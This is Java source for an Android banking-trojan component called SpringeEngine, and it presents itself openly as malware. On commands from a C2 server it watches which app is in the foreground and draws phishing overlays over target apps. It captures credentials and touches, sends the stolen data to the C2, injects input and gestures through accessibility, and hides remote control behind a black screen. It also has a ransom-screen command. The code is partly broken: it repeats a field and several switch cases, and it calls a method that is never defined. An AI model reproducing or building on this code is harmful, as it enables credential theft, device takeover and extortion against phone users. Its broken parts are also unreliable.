package com.fason.app.features.springe;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.fason.app.core.network.SocketClient;
import com.fason.app.features.springe.capture.InputCaptureService;
import com.fason.app.features.springe.data.C2DataPusher;
import com.fason.app.features.springe.data.ExfilQueue;
import com.fason.app.features.springe.delivery.OverlayWindowManager;
import com.fason.app.features.springe.detection.ForegroundAppWatcher;
import com.fason.app.features.springe.injection.AccessibilityInjector;
import com.fason.app.features.springe.overlays.BlackScreenOverlay;
import com.fason.app.features.springe.overlays.WebViewOverlay;
import com.fason.app.features.springe.templates.TemplateManager;
import com.fason.app.features.springe.overlays.InvisibleTouchOverlay;
import com.fason.app.features.springe.overlays.LockScreenOverlay;
import com.fason.app.features.springe.overlays.DialogOverlay;
import com.fason.app.features.springe.overlays.FullScreenOverlay;
import com.fason.app.features.springe.overlays.NotificationOverlay;
import com.fason.app.features.springe.persistence.OverlayPersistenceService;
import com.fason.app.features.springe.persistence.ScreenStateMonitor;
import com.fason.app.features.springe.detection.NotificationTrigger;
import com.fason.app.features.springe.detection.ScheduleTrigger;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * SpringeEngine — Master Orchestrator for the overlay injection system.
 *
 * Central nervous system that coordinates:
 * - Foreground app detection → auto-trigger overlays
 * - Template management (fetch, cache, render)
 * - Overlay window rendering (WebView, invisible, black, lock-screen, dialog)
 * - Input/credential capture
 * - Data exfiltration queue
 * - Accessibility-based injection
 *
 * Thread-safe: all command dispatch runs on a dedicated single-thread executor
 * to prevent race conditions. Callbacks to C2 are async via the existing socket.
 */
public final class SpringeEngine {

    private static final String TAG = "SpringeEngine";

    // Engine states
    public static final int STATE_IDLE = 0;
    public static final int STATE_ARMED = 1;
    public static final int STATE_PAUSED = 2;
    public static final int STATE_OVERLAY_SHOWN = 3;
    public static final int STATE_INVISIBLE_CAPTURE = 4;
    public static final int STATE_BLACK_HVNC = 5;

    private final AtomicInteger state = new AtomicInteger(STATE_IDLE);
    private final AtomicBoolean initialised = new AtomicBoolean(false);

    // Dependencies (injected on init)
    private Context context;
    private SpringeConfig config;
    private ForegroundAppWatcher foregroundWatcher;
    private OverlayWindowManager windowManager;
    private TemplateManager templateManager;
    private ExfilQueue exfilQueue;
    private C2DataPusher dataPusher;
    private InputCaptureService inputCapture;
    private AccessibilityInjector accessibilityInjector;
    private InvisibleTouchOverlay invisibleTouchOverlay;
    private InvisibleTouchOverlay invisibleTouchOverlay;
    private LockScreenOverlay lockScreenOverlay;
    private DialogOverlay dialogOverlay;
    private FullScreenOverlay fullScreenOverlay;
    private NotificationOverlay notificationOverlay;
    private OverlayPersistenceService persistenceService;
    private ScreenStateMonitor screenStateMonitor;
    private ScheduleTrigger scheduleTrigger;

    // Overlay instances
    private WebViewOverlay webViewOverlay;
    private BlackScreenOverlay blackScreenOverlay;

    // Executor for serialized command processing
    private final ExecutorService executor = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "springe-engine");
        t.setDaemon(true);
        return t;
    });

    // Handler for posting to main thread (for UI operations)
    private Handler mainHandler;

    // Singleton
    private static volatile SpringeEngine instance;

    public static SpringeEngine getInstance() {
        if (instance == null) {
            synchronized (SpringeEngine.class) {
                if (instance == null) {
                    instance = new SpringeEngine();
                }
            }
        }
        return instance;
    }

    private SpringeEngine() {}

    /**
     * Initialise the engine. Must be called once from MainService or FasonApp.
     * Safe to call multiple times — subsequent calls are no-ops.
     */
    public void init(Context context) {
        if (!initialised.compareAndSet(false, true)) return;

        this.context = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.config = SpringeConfig.getInstance(context);

        Log.i(TAG, "Initialising Springe Engine v1.0");

        // Initialise subsystems in dependency order
        try {
            this.exfilQueue = new ExfilQueue(context);
            this.dataPusher = new C2DataPusher(exfilQueue);
            this.templateManager = new TemplateManager(context);
            this.windowManager = new OverlayWindowManager(context);
            this.inputCapture = new InputCaptureService(exfilQueue);
            this.foregroundWatcher = new ForegroundAppWatcher(config);
            this.accessibilityInjector = new AccessibilityInjector(context);
            

            this.webViewOverlay = new WebViewOverlay(context, windowManager, templateManager, inputCapture);
            this.blackScreenOverlay = new BlackScreenOverlay(context, windowManager);
            this.invisibleTouchOverlay = new InvisibleTouchOverlay(context, windowManager, inputCapture);
            this.lockScreenOverlay = new LockScreenOverlay(context, windowManager, inputCapture);
            this.dialogOverlay = new DialogOverlay(context, windowManager);
            this.fullScreenOverlay = new FullScreenOverlay(context, windowManager);
            this.notificationOverlay = new NotificationOverlay(context);
            this.persistenceService = new OverlayPersistenceService(context, this);
            this.screenStateMonitor = new ScreenStateMonitor(context, persistenceService);
            this.scheduleTrigger = new ScheduleTrigger(context);
            

            // Auto-arm if previously armed (persistent across restarts)
            if (config.isArmed()) {
                state.set(STATE_ARMED);
                foregroundWatcher.start();
                Log.i(TAG, "Auto-armed from saved state");
            }

            Log.i(TAG, "Springe Engine initialised successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialise Springe Engine", e);
            initialised.set(false);
        }
    }

    /* ──────────────────────────────────────
     * PUBLIC COMMAND API
     * Called from SocketCommandRouter
     * ────────────────────────────────────── */

    /**
     * Process a Springe command from the C2.
     * All commands are serialized onto a single background thread.
     * Returns true if the command was recognised, false otherwise.
     */
    public boolean handleCommand(final JSONObject data, final SocketClient socket, final String cmdId) {
        final String action = data.optString("action", "");
        if (!action.startsWith("springe:")) return false;

        executor.execute(() -> processCommand(action, data, socket, cmdId));
        return true;
    }

    private void processCommand(String action, JSONObject data, SocketClient socket, String cmdId) {
        try {
            switch (action) {
                case SpringeProtocol.CMD_ARM:          handleArm(data, socket, cmdId); break;
                case SpringeProtocol.CMD_DISARM:       handleDisarm(data, socket, cmdId); break;
                case SpringeProtocol.CMD_PAUSE:        handlePause(data, socket, cmdId); break;
                case SpringeProtocol.CMD_RESUME:       handleResume(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SET_TARGETS:  handleSetTargets(data, socket, cmdId); break;
                case SpringeProtocol.CMD_ADD_TARGET:   handleAddTarget(data, socket, cmdId); break;
                case SpringeProtocol.CMD_REMOVE_TARGET:handleRemoveTarget(data, socket, cmdId); break;
                case SpringeProtocol.CMD_LIST_TARGETS: handleListTargets(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SET_TRIGGERS: handleSetTriggers(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW:         handleShowOverlay(data, socket, cmdId); break;
                case SpringeProtocol.CMD_HIDE:         handleHideOverlay(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_INVISIBLE:handleShowInvisible(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_BLACK:   handleShowBlack(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_LOCK:    handleShowLockScreen(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_DIALOG:  handleShowDialog(data, socket, cmdId); break;
                case SpringeProtocol.CMD_LIST_TEMPLATES:handleListTemplates(data, socket, cmdId); break;
                case SpringeProtocol.CMD_FETCH_TEMPLATE:handleFetchTemplate(data, socket, cmdId); break;
                case SpringeProtocol.CMD_DELETE_TEMPLATE:handleDeleteTemplate(data, socket, cmdId); break;
                case SpringeProtocol.CMD_UPDATE_TEMPLATES:handleUpdateTemplates(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_INVISIBLE: handleShowInvisible(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_BLACK:     handleShowBlack(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_LOCK:      handleShowLockScreen(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_DIALOG:    handleShowDialog(data, socket, cmdId); break;
                case SpringeProtocol.CMD_SHOW_RANSOM:    handleShowRansom(data, socket, cmdId); break;
                case SpringeProtocol.CMD_INJECT_INPUT:   handleInjectInput(data, socket, cmdId); break;
                case SpringeProtocol.CMD_INJECT_GESTURE: handleInjectGesture(data, socket, cmdId); break;
                    
                case SpringeProtocol.CMD_INJECT_INPUT: handleInjectInput(data, socket, cmdId); break;
                case SpringeProtocol.CMD_INJECT_GESTURE:handleInjectGesture(data, socket, cmdId); break;
                case SpringeProtocol.CMD_FLUSH:        handleFlush(data, socket, cmdId); break;
                case SpringeProtocol.CMD_GET_STATUS:   handleGetStatus(data, socket, cmdId); break;
                case SpringeProtocol.CMD_CLEAR_CAPTURES:handleClearCaptures(data, socket, cmdId); break;
                default:
                    emitError(socket, cmdId, "Unknown springe command: " + action);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing command: " + action, e);
            emitError(socket, cmdId, "Internal error: " + e.getMessage());
        }
    }

    /* ─── Lifecycle Handlers ─── */

    private void handleArm(JSONObject data, SocketClient socket, String cmdId) {
        if (!initialised.get()) {
            emitError(socket, cmdId, "Engine not initialised");
            return;
        }
        config.setArmed(true);
        state.set(STATE_ARMED);
        foregroundWatcher.start();
        Log.i(TAG, "Engine armed");
        emitStatus(socket, cmdId, "armed", "Engine armed and watching for targets");
    }

    private void handleDisarm(JSONObject data, SocketClient socket, String cmdId) {
        config.setArmed(false);
        foregroundWatcher.stop();
        hideAllOverlays();
        state.set(STATE_IDLE);
        Log.i(TAG, "Engine disarmed");
        emitStatus(socket, cmdId, "disarmed", "Engine disarmed, all overlays hidden");
    }

    private void handlePause(JSONObject data, SocketClient socket, String cmdId) {
        config.setPaused(true);
        state.set(STATE_PAUSED);
        hideAllOverlays();
        emitStatus(socket, cmdId, "paused", "Engine paused");
    }

    private void handleResume(JSONObject data, SocketClient socket, String cmdId) {
        config.setPaused(false);
        if (config.isArmed()) {
            state.set(STATE_ARMED);
        } else {
            state.set(STATE_IDLE);
        }
        emitStatus(socket, cmdId, "resumed", "Engine resumed");
    }

    /* ─── Target Handlers ─── */

    private void handleSetTargets(JSONObject data, SocketClient socket, String cmdId) {
        JSONArray arr = data.optJSONArray(SpringeProtocol.KEY_TARGET_PACKAGES);
        if (arr == null || arr.length() == 0) {
            emitError(socket, cmdId, "No targets provided");
            return;
        }
        java.util.List<SpringeConfig.TargetApp> targets = new java.util.ArrayList<>();
        for (int i = 0; i < arr.length(); i++) {
            JSONObject t = arr.optJSONObject(i);
            if (t != null) {
                targets.add(SpringeConfig.TargetApp.fromJson(t));
            }
        }
        config.setTargets(targets);
        emitStatus(socket, cmdId, "targets_set",
            "Set " + targets.size() + " targets");
    }

    private void handleAddTarget(JSONObject data, SocketClient socket, String cmdId) {
        String pkg = data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, "");
        if (pkg.isEmpty()) { emitError(socket, cmdId, "No package name"); return; }
        SpringeConfig.TargetApp target = new SpringeConfig.TargetApp(
            pkg,
            data.optString("displayName", pkg),
            data.optString("category", "custom"),
            data.optInt("priority", 5),
            data.optBoolean("enabled", true)
        );
        config.addTarget(target);
        emitStatus(socket, cmdId, "target_added", "Added target: " + pkg);
    }

    private void handleRemoveTarget(JSONObject data, SocketClient socket, String cmdId) {
        String pkg = data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, "");
        if (pkg.isEmpty()) { emitError(socket, cmdId, "No package name"); return; }
        config.removeTarget(pkg);
        emitStatus(socket, cmdId, "target_removed", "Removed target: " + pkg);
    }

    private void handleListTargets(JSONObject data, SocketClient socket, String cmdId) {
        try {
            JSONArray arr = new JSONArray();
            for (SpringeConfig.TargetApp t : config.getTargets()) {
                arr.put(t.toJson());
            }
            JSONObject resp = new JSONObject();
            resp.put("type", "target_list");
            resp.put(SpringeProtocol.KEY_TARGET_PACKAGES, arr);
            resp.put("count", arr.length());
            resp.put(SpringeProtocol.KEY_ARMED, config.isArmed());
            emitResponse(socket, cmdId, resp);
        } catch (Exception e) {
            emitError(socket, cmdId, e.getMessage());
        }
    }

    /* ─── Trigger Handlers ─── */

    private void handleSetTriggers(JSONObject data, SocketClient socket, String cmdId) {
        JSONArray arr = data.optJSONArray("triggers");
        if (arr == null) { emitError(socket, cmdId, "No triggers array"); return; }
        java.util.Set<String> triggers = new java.util.HashSet<>();
        for (int i = 0; i < arr.length(); i++) {
            triggers.add(arr.optString(i, ""));
        }
        config.setTriggers(triggers);
        emitStatus(socket, cmdId, "triggers_set", "Triggers configured");
    }

    /* ─── Overlay Handlers ─── */

    private void handleShowOverlay(JSONObject data, SocketClient socket, String cmdId) {
        if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }

        String templateId = data.optString(SpringeProtocol.KEY_TEMPLATE_ID, "default");
        String html = data.optString(SpringeProtocol.KEY_TEMPLATE_HTML, null);

        Runnable showAction = () -> {
            try {
                String htmlToRender = html;
                if (htmlToRender == null) {
                    // Try to load from template manager
                    htmlToRender = templateManager.getTemplateHtml(templateId);
                }
                if (htmlToRender == null) {
                    emitError(socket, cmdId, "No template HTML available");
                    return;
                }

                mainHandler.post(() -> {
                    try {
                        webViewOverlay.show(templateId, htmlToRender,
                            data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, ""));
                        config.setActiveOverlayType(SpringeProtocol.OVERLAY_WEBVIEW);
                        state.set(STATE_OVERLAY_SHOWN);
                        emitStatus(socket, cmdId, "overlay_shown", "WebView overlay displayed");
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to show overlay", e);
                        emitError(socket, cmdId, "Failed to show overlay: " + e.getMessage());
                    }
                });
            } catch (Exception e) {
                emitError(socket, cmdId, e.getMessage());
            }
        };

        if (Looper.myLooper() == Looper.getMainLooper()) {
            showAction.run();
        } else {
            mainHandler.post(showAction);
        }
    }

    private void handleHideOverlay(JSONObject data, SocketClient socket, String cmdId) {
        hideAllOverlays();
        config.setActiveOverlayType(null);
        if (config.isArmed()) state.set(STATE_ARMED);
        else state.set(STATE_IDLE);
        emitStatus(socket, cmdId, "overlay_hidden", "All overlays hidden");
    }

    private void handleShowInvisible(JSONObject data, SocketClient socket, String cmdId) {
        if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }

        mainHandler.post(() -> {
            try {
                // Invisible overlay = WebView overlay with alpha=0 and touch capture enabled
                String html = data.optString(SpringeProtocol.KEY_TEMPLATE_HTML,
                    "<html><body style='background:transparent;'></body></html>");
                webViewOverlay.show("_invisible_", html,
                    data.optString(SpringeProtocol.KEY_TARGET_PACKAGE, ""));
                webViewOverlay.setAlpha(0.01f); // Nearly invisible, still receives touches
                config.setActiveOverlayType(SpringeProtocol.OVERLAY_INVISIBLE);
                state.set(STATE_INVISIBLE_CAPTURE);
                emitStatus(socket, cmdId, "invisible_shown", "Invisible touch capture active");
            } catch (Exception e) {
                emitError(socket, cmdId, "Failed: " + e.getMessage());
            }
        });
    }

    private void handleShowBlack(JSONObject data, SocketClient socket, String cmdId) {
        if (!initialised.get()) { emitError(socket, cmdId, "Engine not initialised"); return; }

        mainHandler.post(() -> {
            try {
                blackScreenOverlay.show();
                config.setActiveOverlayType(SpringeProtocol.OVERLAY_BLACK);
                state.set(STATE_BLACK_HVNC);
                emitStatus(socket, cmdId, "black_shown", "Black screen HVNC concealment active");
            } catch (Exception e) {
                emitError(socket, cmdId, "Failed: " + e.getMessage());
            }
        });
    }

    private void handleShowLockScreen(JSONObject data, SocketClient socket, String cmdId) {
        // Placeholder — full implementation in Phase 8
        emitError(socket, cmdId, "Lock screen overlay not yet implemented");
    }

    private void handleShowDialog(JSONObject data, SocketClient socket, String cmdId) {
        // Placeholder — full implementation in Phase 12
        emitError(socket, cmdId, "Dialog overlay not yet implemented");
    }

    /* ─── Template Handlers ─── */

    private void handleListTemplates(JSONObject data, SocketClient socket, String cmdId) {
        try {
            JSONArray arr = templateManager.listTemplates();
            JSONObject resp = new JSONObject();
            resp.put("type", "template_list");
            resp.put(SpringeProtocol.KEY_TEMPLATES, arr);
            resp.put("count", arr.length());
            emitResponse(socket, cmdId, resp);
        } catch (Exception e) {
            emitError(socket, cmdId, e.getMessage());
        }
    }

    private void handleFetchTemplate(JSONObject data, SocketClient socket, String cmdId) {
        String templateId = data.optString(SpringeProtocol.KEY_TEMPLATE_ID, "");
        if (templateId.isEmpty()) { emitError(socket, cmdId, "No template ID"); return; }
        String url = data.optString(SpringeProtocol.KEY_TEMPLATE_URL, "");
        String html = data.optString(SpringeProtocol.KEY_TEMPLATE_HTML, "");
        int version = data.optInt(SpringeProtocol.KEY_TEMPLATE_VERSION, 1);

        try {
            if (!html.isEmpty()) {
                templateManager.saveTemplate(templateId, html, version);
            } else if (!url.isEmpty()) {
                templateManager.fetchFromUrl(templateId, url, version);
            } else {
                emitError(socket, cmdId, "No HTML or URL provided");
                return;
            }
            config.setTemplateVersion(templateId, version);
            emitStatus(socket, cmdId, "template_fetched", "Template saved: " + templateId);
        } catch (Exception e) {
            emitError(socket, cmdId, "Failed to fetch template: " + e.getMessage());
        }
    }

    private void handleDeleteTemplate(JSONObject data, SocketClient socket, String cmdId) {
        String templateId = data.optString(SpringeProtocol.KEY_TEMPLATE_ID, "");
        if (templateId.isEmpty()) { emitError(socket, cmdId, "No template ID"); return; }
        templateManager.deleteTemplate(templateId);
        emitStatus(socket, cmdId, "template_deleted", "Deleted: " + templateId);
    }

    private void handleUpdateTemplates(JSONObject data, SocketClient socket, String cmdId) {
        JSONArray templates = data.optJSONArray(SpringeProtocol.KEY_TEMPLATES);
        if (templates == null) { emitError(socket, cmdId, "No templates array"); return; }
        int updated = 0;
        for (int i = 0; i < templates.length(); i++) {
            try {
                JSONObject t = templates.getJSONObject(i);
                String id = t.optString(SpringeProtocol.KEY_TEMPLATE_ID, "");
                int version = t.optInt(SpringeProtocol.KEY_TEMPLATE_VERSION, 1);
                if (!id.isEmpty()) {
                    int currentVer = config.getTemplateVersion(id);
                    if (version > currentVer) {
                        String html = t.optString(SpringeProtocol.KEY_TEMPLATE_HTML, "");
                        if (!html.isEmpty()) {
                            templateManager.saveTemplate(id, html, version);
                            config.setTemplateVersion(id, version);
                            updated++;
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        emitStatus(socket, cmdId, "templates_updated", "Updated " + updated + " templates");
    }

    /* ─── Injection Handlers ─── */

    private void handleInjectInput(JSONObject data, SocketClient socket, String cmdId) {
        if (!accessibilityInjector.isReady()) {
            emitError(socket, cmdId, "Accessibility service not connected");
            return;
        }
        String text = data.optString(SpringeProtocol.KEY_INJECTION_DATA, "");
        String target = data.optString(SpringeProtocol.KEY_INJECTION_TARGET, "");
        try {
            accessibilityInjector.injectText(text, target);
            emitStatus(socket, cmdId, "input_injected", "Text injected");
        } catch (Exception e) {
            emitError(socket, cmdId, "Injection failed: " + e.getMessage());
        }
    }

    private void handleInjectGesture(JSONObject data, SocketClient socket, String cmdId) {
        if (!accessibilityInjector.isReady()) {
            emitError(socket, cmdId, "Accessibility service not connected");
            return;
        }
        String gestureType = data.optString("gestureType", "click");
        float x = (float) data.optDouble("x", 0);
        float y = (float) data.optDouble("y", 0);
        try {
            accessibilityInjector.injectGesture(gestureType, x, y);
            emitStatus(socket, cmdId, "gesture_injected", "Gesture performed");
        } catch (Exception e) {
            emitError(socket, cmdId, "Gesture failed: " + e.getMessage());
        }
    }

    /* ─── Data Handlers ─── */

    private void handleFlush(JSONObject data, SocketClient socket, String cmdId) {
        int flushed = dataPusher.flushAll();
        emitStatus(socket, cmdId, "data_flushed", "Flushed " + flushed + " items to C2");
    }

    private void handleGetStatus(JSONObject data, SocketClient socket, String cmdId) {
        try {
            JSONObject status = buildStatus();
            emitResponse(socket, cmdId, status);
        } catch (Exception e) {
            emitError(socket, cmdId, e.getMessage());
        }
    }

    private void handleClearCaptures(JSONObject data, SocketClient socket, String cmdId) {
        exfilQueue.clear();
        emitStatus(socket, cmdId, "captures_cleared", "All captured data cleared");
    }

    /* ──────────────────────────────────────
     * INTERNAL: Triggered by ForegroundAppWatcher
     * Called when the foreground app changes
     * ────────────────────────────────────── */

    /**
     * Called by ForegroundAppWatcher when the foreground app changes.
     * Thread-safe: dispatches to executor.
     */
    public void onForegroundAppChanged(String packageName, String activityName) {
        if (!initialised.get()) return;
        if (!config.isArmed() || config.isPaused()) return;

        executor.execute(() -> {
            try {
                SpringeConfig.TargetApp match = config.matchTarget(packageName);
                if (match == null) return;

                Log.d(TAG, "Target detected: " + packageName + " (match: " + match.displayName + ")");

                // Check if an overlay is already shown for this app
                String currentOverlayPkg = webViewOverlay.getCurrentTargetPackage();
                if (packageName.equals(currentOverlayPkg)) return; // Already showing

                // Hide any existing overlay first
                hideAllOverlays();

                // Load the template for this target
                String templateId = "target_" + packageName;
                String html = templateManager.getTemplateHtml(templateId);

                if (html == null) {
                    // Try global/fallback template
                    html = templateManager.getTemplateHtml("global_fallback");
                }

                if (html == null) {
                    // Check for category-based template
                    html = templateManager.getTemplateHtml("category_" + match.category);
                }

                if (html == null) {
                    Log.d(TAG, "No template found for target: " + packageName);
                    return;
                }

                final String finalHtml = html;
                final String finalTemplateId = templateId;

                mainHandler.post(() -> {
                    try {
                        webViewOverlay.show(finalTemplateId, finalHtml, packageName);
                        config.setActiveOverlayType(SpringeProtocol.OVERLAY_WEBVIEW);
                        state.set(STATE_OVERLAY_SHOWN);
                        Log.i(TAG, "Auto-overlay shown for " + packageName);

                        // Notify C2 of auto-trigger
                        try {
                            JSONObject notification = new JSONObject();
                            notification.put("type", "springe_auto_trigger");
                            notification.put(SpringeProtocol.KEY_TARGET_PACKAGE, packageName);
                            notification.put(SpringeProtocol.KEY_TEMPLATE_ID, finalTemplateId);
                            SocketClient.getSocket().emit("springe", notification);
                        } catch (Exception ignored) {}
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to show auto-overlay", e);
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error in onForegroundAppChanged", e);
            }
        });
    }

    /* ──────────────────────────────────────
     * ACCESSIBILITY EVENT FORWARDING
     * Called from FasonAccessibilityService
     * ────────────────────────────────────── */

    public void onAccessibilityEvent(AccessibilityEvent event) {
        foregroundWatcher.onAccessibilityEvent(event);
    }

    /* ──────────────────────────────────────
     * INTERNAL HELPERS
     * ────────────────────────────────────── */

    private void hideAllOverlays() {
        try {
            mainHandler.post(() -> {
                try { webViewOverlay.hide(); } catch (Exception ignored) {}
                try { blackScreenOverlay.hide(); } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    private JSONObject buildStatus() {
        try {
            JSONObject status = new JSONObject();
            status.put(SpringeProtocol.KEY_ARMED, config.isArmed());
            status.put("paused", config.isPaused());
            status.put("state", state.get());
            status.put(SpringeProtocol.KEY_ACTIVE, config.getActiveOverlayType() != null);
            status.put(SpringeProtocol.KEY_OVERLAY_STATE,
                config.getActiveOverlayType() != null ? config.getActiveOverlayType() : "none");
            status.put("targetCount", config.getTargetCount());
            status.put(SpringeProtocol.KEY_CAPTURE_COUNT, exfilQueue.size());
            status.put("currentApp", foregroundWatcher.getCurrentForegroundApp());
            status.put(SpringeProtocol.KEY_TEMPLATES, templateManager.getTemplateCount());
            status.put("initialised", initialised.get());
            status.put("accessibilityReady", accessibilityInjector != null && accessibilityInjector.isReady());
            return status;
        } catch (Exception e) {
            try {
                JSONObject err = new JSONObject();
                err.put("error", e.getMessage());
                return err;
            } catch (Exception ex) {
                return new JSONObject();
            }
        }
    }

    private void emitStatus(SocketClient socket, String cmdId, String type, String message) {
        try {
            JSONObject resp = new JSONObject();
            resp.put("type", type);
            resp.put(SpringeProtocol.KEY_MESSAGE, message != null ? message : "");
            if (cmdId != null) resp.put("cmdId", cmdId);
            if (socket != null) socket.emit("springe", resp);
        } catch (Exception ignored) {}
    }

    private void emitResponse(SocketClient socket, String cmdId, JSONObject data) {
        try {
            if (cmdId != null) data.put("cmdId", cmdId);
            if (socket != null) socket.emit("springe", data);
        } catch (Exception ignored) {}
    }

    private void emitError(SocketClient socket, String cmdId, String message) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", "error");
            err.put(SpringeProtocol.KEY_MESSAGE, message);
            if (cmdId != null) err.put("cmdId", cmdId);
            if (socket != null) socket.emit("springe", err);
        } catch (Exception ignored) {}
    }

    /* ─── Cleanup ─── */

    public void shutdown() {
        executor.execute(() -> {
            try {
                handleDisarm(null, null, null);
                foregroundWatcher.stop();
                dataPusher.shutdown();
                exfilQueue.clear();
                templateManager.clear();
                mainHandler.post(() -> {
                    try { webViewOverlay.destroy(); } catch (Exception ignored) {}
                    try { blackScreenOverlay.destroy(); } catch (Exception ignored) {}
                });
                Log.i(TAG, "Springe Engine shut down");
            } catch (Exception e) {
                Log.e(TAG, "Error during shutdown", e);
            }
        });
    }
}
